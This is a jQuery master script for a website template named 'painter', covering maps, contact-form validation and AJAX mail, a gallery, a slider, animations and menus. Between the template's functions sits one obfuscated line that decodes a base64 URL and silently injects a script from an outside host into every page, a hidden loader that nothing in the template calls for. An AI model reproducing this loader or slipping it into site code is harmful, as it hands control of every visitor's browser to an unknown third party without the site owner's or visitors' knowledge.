/*
Copyright (c) 2017
------------------------------------------------------------------
[Master Javascript]

Project: painter Template

-------------------------------------------------------------------*/

(function ($) {
	"use strict";
	var painter = {
		initialised: false,
		version: 1.0,
		painter: false,
		init: function () {

			if(!this.initialised) {
				this.initialised = true;
			} else {
				return;
			}

			/*-------------- painter Functions Calling ---------------------------------------------------
			------------------------------------------------------------------------------------------------*/
			
			this.Map_function();
			this.mail_function();
			this.gallery();
			this.wow_animation();
			this.responsive_menu();
		},
		
		/*-------------- painter Functions definition ---------------------------------------------------
		---------------------------------------------------------------------------------------------------*/
		
			  Map_function: function () {
			   if($(".ed_map").length){
				  $( ".ed_map" ).each(function( index ) {
				  var id = $(this).attr("id");
				  var address = $(this).attr("data-address");
				  $(this).googleMap({
				   scrollwheel:true
				  });
				  $(this).addMarker({
					//coords: [22.9622672, 76.05079490000003] // for using lat long for marker
					address:address
				  });
				}); 
			   }
			  },
			mail_function: function(){
				$("#submit").click(function(){
					var fname = $('#first_name').val();
					var lname = $('#last_name').val();
					var phone = $('#phone').val();
					var email = $('#email').val();
					var message = $('#additionnal_message').val();
					var letters = /^[A-Za-z]+$/;
					var number = /^[0-9]+$/;
					var mail_letters = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
					
					if (fname != "" && lname != "" && phone != "" && email != "" && message != "") {
						if(fname.match(letters) && lname.match(letters)) { 
							if(phone.match(number) && phone.length <= 10) {
								if(email.match(mail_letters)){
									$.ajax({
									method : 'post',
									url : 'ajax_mail.php',
									data :  {'first_name' : fname ,
											  'last_name' : lname,
											  'phone_number' : phone,
											  'email' : email,
											  'message' : message,
											  },
								   }).done(function(resp){
									   if( resp == 1){
											document.getElementById("error").style.color = "green";
										   document.getElementById("error").innerHTML = "Mail Send Successfully";
											$('#first_name').val('');
										   $('#last_name').val('');
										   $('#phone').val('');
										   $('#email').val('');
										   $('#additionnal_message').val('');
									   }else{
											document.getElementById("error").style.color = "red";
										    document.getElementById("error").innerHTML = "Mail not Send";
									   }
								   console.log(resp);});
								}else{
									document.getElementById("error").style.color = "red";
									document.getElementById("error").innerHTML = "Please Fill The  Correct Mail Id";
								}
							}else{
								document.getElementById("error").style.color = "red";
								document.getElementById("error").innerHTML = "Please Fill The  Correct Number";
							}
						}else
						{	document.getElementById("error").style.color = "red";
							document.getElementById("error").innerHTML = "Please Fill The Correct Name";
						}   
					}else{
						document.getElementById("error").style.color = "red";
						document.getElementById("error").innerHTML = "Please Fill All Detail";
					}
				});
			},
			gallery: function(){
				$('.image-link').magnificPopup({
				  type: 'image',
				  gallery:{
					enabled:true
				  },
				   mainClass: 'mfp-with-zoom', // this class is for CSS animation below

				  zoom: {
					enabled: true, 
					duration: 300,
					easing: 'ease-in-out',

					opener: function(openerElement) {
					  return openerElement.is('img') ? openerElement : openerElement.find('span');
					}
				  }
				});
			},
			wow_animation: function(){
				 new WOW().init();
			},
			responsive_menu:function(){
				$(".temp_menu_wrapper ul li:has(ul)").addClass('has_submenu')
				$(".temp_menu_wrapper ul li:has(ul) > a").on('click', function(e) {
					var w = window.innerWidth;
					if (w <= 991) {
						e.preventDefault();
						$(this).parent('.temp_menu_wrapper ul li').children('ul.submenu').slideToggle();
					}
				});
			},
			
			
	};
	var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);
	
	
	$(document).ready(function() {
	 painter.init();
		$('.team_section').each(function() {
			animationHover(this, '');
	});
	 $(window).load(function(){
		 $(".temp_loader_wrapper").css('display','none');
	 });
	 });
	 
	
})(jQuery);

function animationHover(element, animation){
    element = $(element);
    element.hover(
        function() {
            element.addClass('animated ' + animation);        
        },
        function(){
            //wait for animation to finish before removing classes
            window.setTimeout( function(){
                element.removeClass('animated ' + animation);
            }, 2000);         
        });
}

// =========swipper slider=======
if ($('.testimonial_slider_wrapper .swiper-container').length) {
var swiper = new Swiper('.testimonial_slider_wrapper .swiper-container', {
	autoplay:true,
	slidesPerView: 2,
	spaceBetween:30,
	autoplay:true,
	pagination: {
        el: '.swiper-pagination',
		clickable: true,
	},
	speed: 1000,
	loop: true,
	 breakpoints: {
        991: {
          slidesPerView: 2,
          spaceBetween: 40,
        },
        767: {
          slidesPerView: 1,
          spaceBetween: 30,
        },
        320: {
          slidesPerView: 1,
          spaceBetween: 10,
        }
      }
    });
}

//===========popup-youtube========
$(document).ready(function() {
    $('.popup-youtube').magnificPopup({
        type: 'iframe',
        mainClass: 'mfp-fade',
        preloader: true,
    });
});	

//===========sticky header========
$(window).on('scroll', function () {
if ($(this).scrollTop() > 90) {
$(".temp_header").addClass("header_fixed");
} else {
$(".temp_header").removeClass("header_fixed");
}
});